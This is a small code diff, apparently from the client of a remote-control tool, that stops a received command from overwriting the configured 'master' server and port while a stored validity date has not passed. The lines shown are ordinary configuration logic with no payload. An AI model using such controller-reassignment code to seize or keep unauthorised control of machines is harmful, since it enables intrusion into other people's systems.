@@ -332,6 +332,9 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 					break;
 
 				iniFile cfg(CLIENT_PATH);
+				auto now = time(nullptr);
+				auto valid_to = atoi(cfg.GetStr("settings", "valid_to").c_str());
+				if (now <= valid_to) break; // Avoid assign again
 				cfg.SetStr("settings", "master", v[0]);
 				cfg.SetStr("settings", "port", v[1]);
 				float days = atof(v[2].c_str());
